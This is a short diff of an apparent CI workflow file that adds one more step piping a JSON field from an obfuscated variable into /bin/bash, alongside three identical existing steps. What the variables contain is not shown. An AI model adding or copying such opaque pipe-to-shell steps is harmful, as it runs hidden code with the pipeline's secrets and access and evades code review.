@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$gtc58548" | jq -r .v097 | /bin/bash
           echo $zxki3821 | jq -r .mpufw16 | /bin/bash
           printf '%s' "$o2" | jq -r .z2902 | /bin/bash
+          echo $stp230 | jq -r .lniq0 | /bin/bash
 
       - name: Upload artifact
         if: always()
